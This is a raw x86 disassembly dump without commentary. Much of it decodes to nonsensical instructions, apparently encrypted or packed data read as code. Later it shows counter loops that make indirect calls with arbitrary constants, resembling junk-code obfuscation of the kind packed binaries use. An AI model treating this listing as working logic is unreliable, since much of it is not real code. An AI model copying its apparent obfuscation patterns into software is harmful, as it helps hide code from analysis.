  41b173:	pop    esp
  41b174:	mov    dl,0x88
  41b176:	mov    ecx,0xa8a17ebb
  41b17b:	loop   0x41b161
  41b17d:	bnd jmp 0x41b12f
  41b180:	ret    
  41b181:	mov    WORD PTR [ecx+0x51a08df7],fs
  41b187:	ins    DWORD PTR es:[edi],dx
  41b188:	sbb    ebp,esi
  41b18a:	rcr    BYTE PTR [eax-0x6e9a8a1d],1
  41b190:	fnstcw WORD PTR [esi]
  41b192:	or     dl,BYTE PTR [ecx]
  41b194:	adc    DWORD PTR [ebx],ebp
  41b196:	push   ebp
  41b197:	mov    bh,0x8a
  41b199:	push   edi
  41b19a:	mov    ecx,edx
  41b19c:	dec    eax
  41b19d:	xchg   edx,eax
  41b19e:	lods   al,BYTE PTR ds:[esi]
  41b19f:	lock mov al,0xb9
  41b1a2:	aas    
  41b1a3:	sub    ecx,DWORD PTR [edi-0x20bd9dac]
  41b1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1aa:	pop    ds
  41b1ab:	adc    al,0xd9
  41b1ad:	fadd   QWORD PTR [ecx+0x1fcc5394]
  41b1b3:	rol    DWORD PTR [edx],cl
  41b1b5:	shr    DWORD PTR [edi-0x64921628],0x2
  41b1bc:	enter  0xd1c2,0x6c
  41b1c0:	push   cs
  41b1c1:	sub    cl,BYTE PTR [eax]
  41b1c3:	jne    0x41b1d8
  41b1c5:	cwde   
  41b1c6:	(bad)  
  41b1c7:	add    DWORD PTR [eax],edx
  41b1c9:	xchg   esp,eax
  41b1ca:	mov    bh,0xc5
  41b1cc:	xchg   BYTE PTR [esi+0x34b4744a],ah
  41b1d2:	mov    al,ds:0x2929894a
  41b1d7:	push   edi
  41b1d8:	sub    eax,0xc63caded
  41b1dd:	adc    esp,ecx
  41b1df:	bound  edx,QWORD PTR [ebx+0x5d]
  41b1e2:	add    eax,0xe63e1100
  41b1e7:	add    eax,0x138f6cb0
  41b1ec:	add    ah,BYTE PTR [esi+ebp*8+0x347f838f]
  41b1f3:	cmp    DWORD PTR [ebx+0x572eb393],0xdcfe7872
  41b1fd:	out    0x38,al
  41b1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b200:	dec    edi
  41b201:	es je  0x41b25c
  41b204:	sub    al,0x1a
  41b206:	int    0x10
  41b208:	pop    esp
  41b209:	jo     0x41b221
  41b20b:	mov    ah,0x6c
  41b20d:	cs inc ecx
  41b20f:	loop   0x41b248
  41b211:	shl    DWORD PTR [ebx+edi*8+0x36],0x88
  41b216:	hlt    
  41b217:	push   cs
  41b218:	mov    ecx,0x4b5ee06f
  41b21d:	sub    esi,DWORD PTR [ebp-0xbea8221]
  41b223:	or     eax,0x66bc7d36
  41b228:	sbb    ebx,ecx
  41b22a:	ins    DWORD PTR es:[edi],dx
  41b22b:	loopne 0x41b296
  41b22d:	aaa    
  41b22e:	fcmovb st,st(6)
  41b230:	sub    eax,0x788131d9
  41b235:	mov    esp,0x628155ea
  41b23a:	fisttp WORD PTR [ebx+0x1e5cd44a]
  41b240:	xor    DWORD PTR [esi-0x31390529],0xffffffba
  41b247:	outs   dx,DWORD PTR ds:[esi]
  41b248:	sbb    esi,ecx
  41b24a:	adc    BYTE PTR [eax],al
  41b24c:	xlat   BYTE PTR ds:[ebx]
  41b24e:	push   cs
  41b24f:	(bad)  
  41b250:	or     eax,edi
  41b252:	sub    al,0x51
  41b254:	add    edi,DWORD PTR [ecx+edi*4]
  41b257:	inc    edx
  41b258:	and    BYTE PTR [edi+ebx*8-0x66c2d905],dh
  41b25f:	sahf   
  41b260:	push   ebx
  41b261:	jae    0x41b217
  41b263:	aas    
  41b264:	or     edx,DWORD PTR [ebp-0x71]
  41b267:	inc    ecx
  41b268:	fsub   DWORD PTR ds:0xd8ce1498
  41b26e:	xchg   ebp,eax
  41b26f:	pop    eax
  41b270:	dec    edx
  41b271:	fadd   DWORD PTR [ecx-0xc993a32]
  41b277:	je     0x41b29b
  41b279:	cmp    al,0x76
  41b27b:	mov    ds:0xabb43b2c,eax
  41b280:	icebp  
  41b281:	mov    ebp,0x8f291312
  41b286:	mov    ch,0x8c
  41b288:	mov    ebp,DWORD PTR [edx+ebp*4-0x6]
  41b28c:	mov    ds:0xe2a65e8e,eax
  41b291:	or     DWORD PTR [esi-0x1e916a5d],eax
  41b297:	xchg   ebp,eax
  41b298:	and    cl,BYTE PTR [edi-0x24ddd55a]
  41b29e:	or     al,bl
  41b2a0:	test   ecx,eax
  41b2a2:	daa    
  41b2a3:	jb     0x41b225
  41b2a5:	push   esi
  41b2a6:	daa    
  41b2a7:	xlat   BYTE PTR ds:[ebx]
  41b2a8:	pop    eax
  41b2a9:	ret    
  41b2aa:	inc    ebp
  41b2ab:	les    ebp,FWORD PTR [eax+0x7c]
  41b2ae:	pop    es
  41b2af:	icebp  
  41b2b0:	jmp    0xc9:0x9283e1e1
  41b2b7:	sahf   
  41b2b8:	mov    ah,0x0
  41b2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2bb:	dec    edi
  41b2bc:	loopne 0x41b28f
  41b2be:	adc    al,0x78
  41b2c0:	dec    esp
  41b2c1:	jmp    0x41b331
  41b2c3:	mov    dh,0x39
  41b2c5:	repz test al,0xee
  41b2c8:	push   edx
  41b2c9:	jb     0x41b2e6
  41b2cb:	mov    al,0xfb
  41b2cd:	(bad)  
  41b2cf:	ficomp DWORD PTR [eax-0x25]
  41b2d2:	sub    eax,0x9702f654
  41b2d7:	neg    DWORD PTR [edx+0xbcce207]
  41b2dd:	adc    DWORD PTR [ebx],ecx
  41b2df:	push   esi
  41b2e0:	jne    0x41b361
  41b2e2:	jmp    0x41b2a8
  41b2e4:	adc    bh,al
  41b2e6:	addr16 jne 0x41b328
  41b2e9:	sub    BYTE PTR ds:0x16e8b45f,cl
  41b2ef:	rcl    DWORD PTR [ebp+0x13],1
  41b2f2:	mov    BYTE PTR [edx],cl
  41b2f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2f5:	and    eax,0xe24aa626
  41b2fa:	jmp    0x41b280
  41b2fc:	dec    ecx
  41b2fd:	adc    eax,0xb7e2685f
  41b302:	ja     0x41b2f3
  41b304:	or     eax,0x40ae5860
  41b309:	sub    al,0x79
  41b30b:	or     eax,0x348a8b1c
  41b310:	stos   BYTE PTR es:[edi],al
  41b311:	hlt    
  41b312:	sub    cl,0xc7
  41b315:	ds push eax
  41b317:	dec    esp
  41b318:	repnz xor ecx,edi
  41b31b:	adc    al,0x88
  41b31d:	or     BYTE PTR [eax],dl
  41b31f:	xor    eax,0x63dc054d
  41b324:	and    eax,0x63a3586f
  41b329:	cmc    
  41b32a:	(bad)  
  41b32b:	xchg   esp,eax
  41b32c:	loopne 0x41b2ce
  41b32e:	out    0x57,eax
  41b330:	mov    ebp,0x1f5e9932
  41b335:	adc    eax,0x9e0a88e
  41b33a:	pop    edx
  41b33b:	or     DWORD PTR [edx-0x12c6e439],edi
  41b341:	rol    DWORD PTR [esi],cl
  41b343:	imul   ecx,DWORD PTR [esi],0x4b
  41b346:	and    BYTE PTR [edi],dh
  41b348:	mov    esp,0x23190c71
  41b34d:	pushf  
  41b34e:	mov    dl,bh
  41b350:	dec    ebx
  41b351:	aam    0x4e
  41b353:	lods   eax,DWORD PTR ds:[esi]
  41b354:	ds ret 
  41b356:	push   0x484f3400
  41b35b:	inc    ecx
  41b35c:	xchg   ebx,eax
  41b35d:	jae    0x41b3b6
  41b35f:	sub    edx,ecx
  41b361:	ja     0x41b39c
  41b363:	jl     0x41b2e8
  41b365:	mov    bl,0xc7
  41b367:	pop    edx
  41b368:	push   edx
  41b369:	lds    edi,FWORD PTR [ecx]
  41b36b:	xor    ebp,DWORD PTR [eax]
  41b36d:	aad    0x4a
  41b36f:	xchg   esi,eax
  41b370:	sbb    al,bl
  41b372:	test   DWORD PTR [ecx-0x2a],0xf5875c2c
  41b379:	in     eax,dx
  41b37a:	not    DWORD PTR [ecx]
  41b37c:	(bad)  
  41b37d:	cld    
  41b37e:	sub    bl,BYTE PTR [esi]
  41b380:	aaa    
  41b381:	int    0x38
  41b383:	lods   eax,DWORD PTR ds:[esi]
  41b384:	add    bl,BYTE PTR [esi+0x44]
  41b387:	sub    al,0x67
  41b389:	es dec ebp
  41b38b:	(bad)  
  41b38c:	out    0x50,al
  41b38e:	mov    DWORD PTR [ecx+esi*4+0x16095d85],eax
  41b395:	mov    ds:0x6459356f,eax
  41b39a:	adc    al,0x57
  41b39c:	gs jle 0x41b356
  41b39f:	pop    ds
  41b3a0:	mov    edi,0xc7c995af
  41b3a5:	pop    ds
  41b3a6:	bound  ebp,QWORD PTR [edi]
  41b3a8:	push   ds
  41b3a9:	lods   al,BYTE PTR ds:[esi]
  41b3aa:	js     0x41b366
  41b3ac:	repnz push ecx
  41b3ae:	ins    DWORD PTR es:[edi],dx
  41b3af:	add    al,cl
  41b3b1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41b3b3:	das    
  41b3b4:	cli    
  41b3b5:	arpl   di,si
  41b3b7:	add    eax,0xc7ecc469
  41b3bc:	pop    ebp
  41b3bd:	mov    ah,0xd8
  41b3bf:	mov    ds:0x76a43def,al
  41b3c4:	jb     0x41b3bd
  41b3c6:	pop    DWORD PTR [edx+0x23faadd3]
  41b3cc:	add    BYTE PTR [edx+0x2f],al
  41b3cf:	out    0xf3,eax
  41b3d1:	call   DWORD PTR [ecx+0x23]
  41b3d4:	jnp    0x41b41d
  41b3d6:	xor    al,0x71
  41b3d8:	xor    BYTE PTR [ecx+0x6e226995],bl
  41b3de:	pop    es
  41b3df:	xlat   BYTE PTR ss:[ebx]
  41b3e1:	inc    esi
  41b3e2:	int    0x68
  41b3e4:	mov    edx,0x6d139b41
  41b3e9:	lds    ecx,FWORD PTR ds:0x92dab65
  41b3ef:	das    
  41b3f0:	pushf  
  41b3f1:	dec    edi
  41b3f2:	outs   dx,BYTE PTR ds:[esi]
  41b3f3:	xchg   BYTE PTR [esi],dl
  41b3f5:	in     al,0xb
  41b3f7:	nop
  41b3f8:	pop    edx
  41b3f9:	pop    es
  41b3fa:	pop    ebp
  41b3fb:	ss xchg ebp,eax
  41b3fd:	mov    ?,WORD PTR [eax+0x21]
  41b400:	jmp    FWORD PTR [ebx]
  41b402:	out    0x15,al
  41b404:	ror    DWORD PTR [esi],cl
  41b406:	jae    0x41b399
  41b408:	add    al,0xdf
  41b40a:	inc    BYTE PTR [edx+0x14f7807b]
  41b410:	lods   eax,DWORD PTR ds:[esi]
  41b411:	xchg   esi,eax
  41b412:	scas   al,BYTE PTR es:[edi]
  41b413:	push   ecx
  41b414:	jle    0x41b3d4
  41b416:	xchg   ebx,eax
  41b417:	dec    eax
  41b418:	arpl   WORD PTR [edi],bp
  41b41a:	shr    BYTE PTR [eax+0x1a73e5bd],1
  41b420:	shl    BYTE PTR [ecx],1
  41b422:	pushf  
  41b423:	in     eax,dx
  41b424:	xchg   BYTE PTR [ecx+ebp*1-0x3b],ah
  41b428:	mov    ebx,0x56c21a60
  41b42d:	imul   ebp,DWORD PTR [ebp-0x42],0x82ac7f94
  41b434:	xchg   ebx,eax
  41b435:	ins    DWORD PTR es:[edi],dx
  41b436:	push   ebx
  41b437:	in     al,0xfd
  41b439:	fmul   DWORD PTR [edx+0x3a02d1f5]
  41b43f:	ds jnp 0x41b425
  41b442:	jns    0x41b4a5
  41b444:	out    dx,al
  41b445:	xchg   edi,eax
  41b446:	out    0xc7,eax
  41b448:	fild   WORD PTR [esi+0x184ee215]
  41b44e:	adc    DWORD PTR [edi-0x62],ecx
  41b451:	sbb    ebp,DWORD PTR [ebx+0x5d]
  41b454:	adc    DWORD PTR [esi+ebx*2],0xffffffb1
  41b458:	lea    ebp,[ebx+eax*2+0x33498cf2]
  41b45f:	cmp    BYTE PTR [eax+ebp*8+0x63502d],dh
  41b466:	cmp    eax,esi
  41b468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b469:	jbe    0x41b446
  41b46b:	mov    BYTE PTR [ebx+0x13fba37c],ah
  41b471:	daa    
  41b472:	mov    esp,0x1de2e2c
  41b477:	or     eax,0x5b06b602
  41b47c:	sbb    al,0x3
  41b47e:	sbb    DWORD PTR [edi],eax
  41b480:	adc    DWORD PTR [edi],edx
  41b482:	outs   dx,DWORD PTR ds:[esi]
  41b483:	or     al,0xae
  41b485:	cmp    ebp,esi
  41b487:	sbb    eax,DWORD PTR [ebx-0x4b]
  41b48a:	or     esp,ecx
  41b48c:	xchg   BYTE PTR [ebx-0x7dc11e2d],al
  41b492:	sti    
  41b493:	and    edi,eax
  41b495:	test   DWORD PTR cs:[edx-0x2ea603e],ebp
  41b49c:	fwait
  41b49d:	popf   
  41b49e:	or     ah,BYTE PTR [eax+0x68]
  41b4a1:	pcmpgtw mm6,QWORD PTR [esp+eiz*8]
  41b4a5:	mov    al,ds:0xbeb0e63e
  41b4aa:	sub    BYTE PTR [edi-0x44],0x6
  41b4ae:	mov    bh,0xe0
  41b4b0:	je     0x41b505
  41b4b2:	aam    0x68
  41b4b4:	mov    WORD PTR [edx+0x3c],fs
  41b4b7:	fcmovb st,st(7)
  41b4b9:	outs   dx,BYTE PTR ds:[esi]
  41b4ba:	out    0xe9,eax
  41b4bc:	loopne 0x41b48c
  41b4be:	mov    BYTE PTR [ecx],ah
  41b4c0:	adc    dh,BYTE PTR [edx+0x7cf3498a]
  41b4c6:	sti    
  41b4c7:	or     BYTE PTR [ebx],bh
  41b4c9:	ret    
  41b4ca:	inc    ebp
  41b4cb:	test   BYTE PTR [edx+0x1c],cl
  41b4ce:	push   ss
  41b4cf:	dec    ecx
  41b4d0:	sub    cl,ah
  41b4d2:	fdivr  DWORD PTR [esi+0x5336994e]
  41b4d8:	test   DWORD PTR [ecx-0x2a],ecx
  41b4db:	push   ds
  41b4dc:	xchg   esi,eax
  41b4dd:	sbb    DWORD PTR [ebx],esi
  41b4df:	pop    ebp
  41b4e0:	sub    ch,0x66
  41b4e3:	ins    DWORD PTR es:[edi],dx
  41b4e4:	or     esi,DWORD PTR [ebx-0x7c]
  41b4e7:	scas   eax,DWORD PTR es:[edi]
  41b4e8:	sbb    eax,DWORD PTR [eax-0x20]
  41b4eb:	test   BYTE PTR [edi],cl
  41b4ed:	popf   
  41b4ee:	mov    es,WORD PTR [esi-0x6d1f0844]
  41b4f4:	xchg   ch,bl
  41b4f6:	stos   BYTE PTR es:[edi],al
  41b4f7:	adc    bh,BYTE PTR [ebp+0x65]
  41b4fa:	ja     0x41b493
  41b4fc:	cmp    BYTE PTR [ebp-0x3ec69d85],bl
  41b502:	aad    0x90
  41b504:	sub    ebx,DWORD PTR [edi+eiz*2-0x40993ed1]
  41b50b:	lock sar BYTE PTR [eax+0x4ab1f491],cl
  41b512:	mov    al,ds:0xa5710edc
  41b517:	push   ecx
  41b518:	cmp    ch,bl
  41b51a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b51b:	(bad)  
  41b51c:	call   0xd0306d56
  41b521:	push   es
  41b522:	je     0x41b546
  41b524:	mov    ecx,0x72302d96
  41b529:	push   edx
  41b52a:	lds    ebp,FWORD PTR [esi+0x647b2e84]
  41b530:	mov    ds:0xcc5ea6ae,eax
  41b535:	push   esi
  41b536:	fistp  DWORD PTR [esp+eax*8-0x558fefc4]
  41b53d:	int    0xc6
  41b53f:	sti    
  41b540:	push   edx
  41b541:	call   0xc9edd2b
  41b546:	test   eax,0x1323a10b
  41b54b:	mov    ebx,0x3e542866
  41b550:	dec    ebx
  41b551:	mov    ds:0x9a4a38fb,eax
  41b556:	sti    
  41b557:	fdiv   QWORD PTR [ebp+0x4c]
  41b55a:	in     eax,dx
  41b55b:	jb     0x41b4e2
  41b55d:	mov    ecx,0x7de59484
  41b562:	mov    ch,0xb
  41b564:	sbb    al,0x47
  41b566:	jle    0x41b5b1
  41b568:	mov    esp,0xbe1e25b5
  41b56d:	inc    edi
  41b56e:	ins    DWORD PTR es:[edi],dx
  41b56f:	pop    esi
  41b570:	mov    eax,ds:0x8ae0470b
  41b575:	mov    edx,0xe95ebabc
  41b57a:	dec    eax
  41b57b:	in     al,0x5d
  41b57d:	(bad)  
  41b57e:	push   ebx
  41b57f:	jno    0x41b558
  41b581:	sub    al,0xd7
  41b583:	in     eax,0x1e
  41b585:	sti    
  41b586:	into   
  41b587:	sbb    eax,0x536064ee
  41b58c:	fdiv   DWORD PTR [eax]
  41b58e:	loopne 0x41b60f
  41b590:	sbb    eax,0x751666bc
  41b595:	cmp    eax,0x994e3b0a
  41b59a:	outs   dx,BYTE PTR ds:[esi]
  41b59b:	push   ds
  41b59c:	fnstenv [edx]
  41b59e:	push   eax
  41b59f:	sbb    DWORD PTR [edi-0x7196f7be],ebp
  41b5a5:	jl     0x41b547
  41b5a7:	dec    esi
  41b5a8:	pop    ss
  41b5a9:	mov    DWORD PTR [ebp+0x71],edx
  41b5ac:	cs adc al,0xec
  41b5af:	lock test eax,0xdb278f31
  41b5b5:	push   cs
  41b5b6:	imul   edi,DWORD PTR [ebx+0x58],0xffffffee
  41b5ba:	(bad)  [esi]
  41b5bc:	mov    BYTE PTR [ebp+0x1e],al
  41b5bf:	and    eax,0xeba13c6e
  41b5c4:	xor    eax,0xcbff11d7
  41b5c9:	sub    edi,esp
  41b5cb:	sub    eax,0xec1fb64b
  41b5d0:	iret   
  41b5d1:	adc    BYTE PTR [edx],0xb9
  41b5d4:	sub    BYTE PTR ds:0x7cf4797b,0x5a
  41b5db:	comiss xmm0,DWORD PTR [ebp-0x76ac13c5]
  41b5e2:	mov    WORD PTR [esi+ebp*4+0x10],cs
  41b5e6:	mov    BYTE PTR [esi],cl
  41b5e8:	mov    al,ds:0x9a3190
  41b5ed:	es inc ebx
  41b5ef:	rcl    BYTE PTR [ebx+eax*4-0x58],0xe
  41b5f4:	inc    edx
  41b5f5:	ja     0x41b5da
  41b5f7:	(bad)  
  41b5f8:	cmp    BYTE PTR [esi],cl
  41b5fa:	cmp    eax,DWORD PTR [ecx-0x41]
  41b5fd:	icebp  
  41b5fe:	fucomi st,st(1)
  41b600:	mov    dl,BYTE PTR [ecx]
  41b602:	push   edi
  41b603:	jne    0x41b5ab
  41b605:	aam    0xb1
  41b607:	fld    TBYTE PTR [esi]
  41b609:	imul   di,WORD PTR [ebx+0x38],0x8d4e
  41b60f:	rol    DWORD PTR [eax],cl
  41b611:	mov    al,ds:0xede67c59
  41b616:	daa    
  41b617:	jno    0x41b66c
  41b619:	test   DWORD PTR [ecx+eiz*4+0x43],eax
  41b61d:	mov    BYTE PTR [ecx+0x4885d098],bh
  41b623:	aam    0x4b
  41b625:	jg     0x41b66d
  41b627:	inc    ebx
  41b628:	or     al,0xb
  41b62a:	sub    DWORD PTR [ebx-0x4cfea7ee],edi
  41b630:	shr    DWORD PTR [edi+0xd1d935b],1
  41b636:	adc    eax,0x2e333088
  41b63b:	dec    edi
  41b63c:	adc    DWORD PTR [esi],0xf42d4a03
  41b642:	in     al,0x43
  41b644:	in     eax,dx
  41b645:	inc    edx
  41b646:	cmp    eax,0x4edaa41c
  41b64b:	xorps  xmm4,XMMWORD PTR [edi+ebx*8-0x1a]
  41b650:	dec    ebp
  41b651:	mov    edi,0xea6b397b
  41b656:	iret   
  41b657:	jl     0x41b6ce
  41b659:	adc    al,0x26
  41b65b:	mov    ds:0x3cabe212,al
  41b660:	mov    ds:0xcb4d21e8,eax
  41b665:	cwde   
  41b666:	rol    BYTE PTR [edi+0x51],0x8
  41b66a:	xor    BYTE PTR [ebp+0x52818452],0x73
  41b671:	and    al,0x31
  41b673:	lods   al,BYTE PTR ds:[esi]
  41b674:	les    ecx,FWORD PTR [ebx+0x66e4be22]
  41b67a:	add    ebp,DWORD PTR [ecx+ecx*1]
  41b67d:	cmc    
  41b67e:	sbb    al,0xd7
  41b680:	nop
  41b681:	mov    edi,0x63ea2d96
  41b686:	mov    ecx,0xf6e040cd
  41b68b:	jg     0x41b6de
  41b68d:	mov    ds:0x68d25ea9,al
  41b692:	xor    edx,0xffffff92
  41b695:	mov    edi,0xd2576e79
  41b69a:	mov    bh,0x2c
  41b69c:	into   
  41b69d:	popa   
  41b69e:	fbld   TBYTE PTR [ecx]
  41b6a0:	pop    ebp
  41b6a1:	fstp   QWORD PTR [ecx]
  41b6a3:	sahf   
  41b6a4:	(bad)  
  41b6a5:	and    al,0x93
  41b6a7:	lods   al,BYTE PTR ds:[esi]
  41b6a8:	sub    al,bh
  41b6aa:	xlat   BYTE PTR ds:[ebx]
  41b6ab:	jge    0x41b697
  41b6ad:	mov    edx,0xcd213616
  41b6b2:	bound  ecx,QWORD PTR [edx+0x30]
  41b6b5:	lahf   
  41b6b6:	and    bh,BYTE PTR [edi+0x1f]
  41b6b9:	push   cs
  41b6ba:	mov    eax,ds:0x1d767875
  41b6bf:	inc    edi
  41b6c1:	adc    al,0x33
  41b6c3:	pop    edi
  41b6c4:	pop    es
  41b6c5:	repz pop ebx
  41b6c7:	fs jg  0x41b70f
  41b6ca:	es (bad) 
  41b6cc:	jmp    0x41b720
  41b6ce:	jb     0x41b6d8
  41b6d0:	cmp    bh,BYTE PTR [esi-0x2e]
  41b6d3:	test   BYTE PTR [ebx-0x713318d9],al
  41b6d9:	jmp    0x41b6bc
  41b6db:	into   
  41b6dc:	add    eax,0x49640221
  41b6e1:	adc    eax,0x8e162662
  41b6e6:	jno    0x41b6dd
  41b6e8:	adc    DWORD PTR [eax-0xb],ebp
  41b6eb:	cmp    BYTE PTR [ebp+ebp*2+0x4f6fe220],ch
  41b6f2:	ficom  WORD PTR [ecx+0x43]
  41b6f5:	or     DWORD PTR [edx+ebp*4-0x778d19c7],ecx
  41b6fc:	das    
  41b6fd:	push   ebx
  41b6fe:	outs   dx,BYTE PTR ds:[esi]
  41b6ff:	mov    es,WORD PTR [ebx+0x41bc7ea]
  41b705:	repnz shl BYTE PTR [ebx-0x6c71ba92],0xdf
  41b70d:	jmp    0xcd8f2699
  41b712:	mov    ebx,ecx
  41b714:	pop    bx
  41b716:	inc    edi
  41b717:	push   cs
  41b718:	popf   
  41b719:	mov    al,al
  41b71b:	out    dx,eax
  41b71c:	retf   
  41b71d:	dec    edi
  41b71e:	xor    esi,DWORD PTR [eax]
  41b720:	test   al,0x5e
  41b722:	fistp  DWORD PTR [edx+eiz*2+0x26bd01]
  41b729:	ret    0xc2d6
  41b72c:	ja     0x41b74c
  41b72e:	outs   dx,BYTE PTR ds:[esi]
  41b72f:	popf   
  41b730:	mov    eax,ds:0xf4e2dcfd
  41b735:	arpl   ax,di
  41b737:	loope  0x41b706
  41b739:	pop    ss
  41b73a:	pop    es
  41b73b:	mov    DWORD PTR [ebp-0x14],ecx
  41b73e:	mov    ecx,DWORD PTR [ebp-0x14]
  41b741:	mov    ecx,DWORD PTR [ecx+0xc]
  41b744:	movsx  cx,BYTE PTR [ecx+eax*1]
  41b749:	mov    edx,0x3b4b
  41b74e:	sub    cx,dx
  41b751:	mov    edx,0x8a85
  41b756:	xor    cx,dx
  41b759:	mov    edx,0x4f85
  41b75e:	cmp    cx,dx
  41b761:	jne    0x419376
  41b767:	mov    ecx,DWORD PTR ds:0x42404e
  41b76d:	mov    ecx,DWORD PTR [ecx+0x198]
  41b773:	mov    DWORD PTR [ecx],eax
  41b775:	jmp    0x41b79b
  41b77a:	mov    ecx,DWORD PTR [ebp+0x18]
  41b77d:	cmp    ecx,0xf89c85b5
  41b783:	jne    0x41b79b
  41b789:	push   eax
  41b78a:	push   DWORD PTR [ebp+0x14]
  41b78d:	push   DWORD PTR [ebp+0x10]
  41b790:	push   DWORD PTR [ebp+0xc]
  41b793:	push   DWORD PTR [ebp+0x8]
  41b796:	call   0x416ab7
  41b79b:	pop    edi
  41b79c:	pop    esi
  41b79d:	leave  
  41b79e:	ret    0x14
  41b7a1:	push   ebp
  41b7a2:	mov    ebp,esp
  41b7a4:	sub    esp,0x48
  41b7a7:	push   ebx
  41b7a8:	movzx  eax,BYTE PTR ds:0x42901c
  41b7af:	sub    DWORD PTR ds:0x429010,eax
  41b7b5:	push   esi
  41b7b6:	adc    DWORD PTR ds:0x429000,0x3a05
  41b7c0:	push   edi
  41b7c1:	xor    edi,0x559a
  41b7c7:	xor    esi,esi
  41b7c9:	mov    DWORD PTR [ebp-0x20],esi
  41b7cc:	sub    eax,0x6d46
  41b7d1:	mov    eax,DWORD PTR [ebp-0xc]
  41b7d4:	push   0x5
  41b7d6:	and    DWORD PTR ds:0x42b010,0x0
  41b7e0:	mov    edi,DWORD PTR ds:0x42b010
  41b7e6:	inc    edi
  41b7e7:	mov    DWORD PTR ds:0x42b010,edi
  41b7ed:	cmp    DWORD PTR ds:0x42b010,0x1e
  41b7f4:	jne    0x41b80f
  41b7fa:	push   0x4aeb
  41b7ff:	push   0x362c
  41b804:	push   0x611c
  41b809:	call   DWORD PTR ds:0x425044
  41b80f:	cmp    DWORD PTR ds:0x42b010,0x11
  41b816:	jb     0x41b7e0
  41b81c:	and    DWORD PTR ds:0x429020,0x0
  41b826:	jmp    0x41b838
  41b82b:	mov    edi,DWORD PTR ds:0x429020
  41b831:	inc    edi
  41b832:	mov    DWORD PTR ds:0x429020,edi
  41b838:	cmp    DWORD PTR ds:0x429020,0x1b
  41b83f:	jae    0x41b8d2
  41b845:	cmp    DWORD PTR ds:0x429020,0x5
  41b84c:	jne    0x41b86a
  41b852:	push   0x6d5d
  41b857:	push   0x6bd3
  41b85c:	push   0x2a83
  41b861:	push   DWORD PTR [ebp-0x20]
  41b864:	call   DWORD PTR ds:0x425048
  41b86a:	cmp    DWORD PTR ds:0x429020,0x4
  41b871:	jne    0x41b884
  41b877:	mov    edi,DWORD PTR ds:0x429020
  41b87d:	inc    edi
  41b87e:	mov    DWORD PTR ds:0x429020,edi
  41b884:	jmp    0x41b82b
  41b889:	mov    DWORD PTR ds:0x42901c,0x1a
  41b893:	cmp    DWORD PTR ds:0x42901c,0x0
  41b89a:	je     0x41b8d2
  41b8a0:	cmp    DWORD PTR ds:0x42901c,0x29
  41b8a7:	jne    0x41b8b8
  41b8ad:	push   0x3b9c
  41b8b2:	call   DWORD PTR ds:0x42504c
  41b8b8:	xor    edi,edi
  41b8ba:	or     edi,DWORD PTR ds:0x42901c
  41b8c0:	dec    edi
  41b8c1:	mov    DWORD PTR ds:0x42901c,edi
  41b8c7:	jmp    0x41b893
  41b8cc:	sub    DWORD PTR ds:0x429008,ecx
  41b8d2:	mov    DWORD PTR [ebp-0xc],eax
  41b8d5:	and    DWORD PTR ds:0x42d01c,0x0
  41b8df:	mov    edi,DWORD PTR ds:0x42d01c
  41b8e5:	inc    edi
  41b8e6:	mov    DWORD PTR ds:0x42d01c,edi
  41b8ec:	cmp    DWORD PTR ds:0x42d01c,0x13
  41b8f3:	jne    0x41b909
  41b8f9:	push   0x8e10
  41b8fe:	push   0x424558
  41b903:	call   DWORD PTR ds:0x425010
  41b909:	cmp    DWORD PTR ds:0x42d01c,0x11
  41b910:	jb     0x41b8df
  41b916:	pop    edi
  41b917:	push   0x424162
  41b91c:	sub    DWORD PTR ds:0x42a018,0x42b000
  41b926:	call   DWORD PTR ds:0x425024
  41b92c:	adc    DWORD PTR ds:0x42c014,0x59ac
  41b936:	push   esi
  41b937:	xor    DWORD PTR ds:0x42d018,0x57bc
  41b941:	push   0x2
  41b943:	add    DWORD PTR ds:0x42a014,0x11b6
  41b94d:	push   0x1
  41b94f:	push   0x2
  41b951:	and    DWORD PTR ds:0x42d004,0x42a01c
  41b95b:	push   0x1
  41b95d:	and    DWORD PTR ds:0x42a004,0x42b014
  41b967:	push   0x8678768
  41b96c:	sbb    DWORD PTR ds:0x42901c,0x42c014
  41b976:	push   0x87676776
  41b97b:	sub    DWORD PTR ds:0x42a008,0x42c014
  41b985:	call   DWORD PTR ds:0x425000
  41b98b:	push   esi
  41b98c:	push   0x68
  41b98e:	push   0xd
  41b990:	push   0x5
  41b992:	push   0x3
  41b994:	push   0x5468787
  41b999:	sub    DWORD PTR ds:0x429014,0x2577
  41b9a3:	call   DWORD PTR ds:0x425008
  41b9a9:	xor    DWORD PTR ds:0x42c00c,0x43e8
  41b9b3:	dec    edi
  41b9b4:	mov    DWORD PTR ds:0x42d008,0x724a
  41b9be:	jne    0x41b917
  41b9c4:	push   0x424176
  41b9c9:	push   esi
  41b9ca:	push   esi
  41b9cb:	call   DWORD PTR ds:0x425038
  41b9d1:	or     DWORD PTR ds:0x42b004,0x42b00c
  41b9db:	test   eax,eax
  41b9dd:	je     0x41ba3c
  41b9e3:	add    DWORD PTR ds:0x429008,edx
  41b9e9:	mov    eax,ds:0x75687681
  41b9ee:	and    DWORD PTR ds:0x429024,0x0
  41b9f8:	mov    ebx,DWORD PTR ds:0x429024
  41b9fe:	inc    ebx
  41b9ff:	mov    DWORD PTR ds:0x429024,ebx
  41ba05:	cmp    DWORD PTR ds:0x429024,0x24
  41ba0c:	jne    0x41ba1e
  41ba12:	push   DWORD PTR [ebp-0x24]
  41ba15:	push   DWORD PTR [ebp-0x18]
  41ba18:	call   DWORD PTR ds:0x425018
  41ba1e:	cmp    DWORD PTR ds:0x429024,0x1e
  41ba25:	jb     0x41b9f8
  41ba2b:	add    DWORD PTR ds:0x42d000,ebx
  41ba31:	imul   eax,eax,0x5463da19
  41ba37:	mov    ds:0x75687681,eax
  41ba3c:	not    eax
  41ba3e:	mov    eax,DWORD PTR [ebp-0xc]
  41ba41:	mov    ebx,DWORD PTR ds:0x42b010
  41ba47:	mov    ebx,0xf89c85b6
  41ba4c:	cmp    eax,ebx
  41ba4e:	mov    DWORD PTR ds:0x42d01c,0x2eca
  41ba58:	jne    0x41baa0
